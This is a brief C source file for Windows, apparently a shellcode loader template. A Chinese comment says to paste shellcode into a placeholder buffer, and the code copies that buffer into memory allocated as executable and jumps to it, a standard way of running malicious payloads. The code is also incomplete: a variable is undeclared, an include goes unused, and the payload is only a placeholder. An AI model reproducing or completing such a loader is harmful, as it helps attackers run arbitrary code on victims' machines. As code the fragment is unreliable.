#include <Windows.h>
#include <String.h>
#include <base64.h>

unsigned char buf[] =
"\x2f\x4f--shellcode--\x3d";//将上面的shellcode拷贝到这里

main()
{
	Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, buf, sizeof(buf));
	((void(*)())Memory)();
}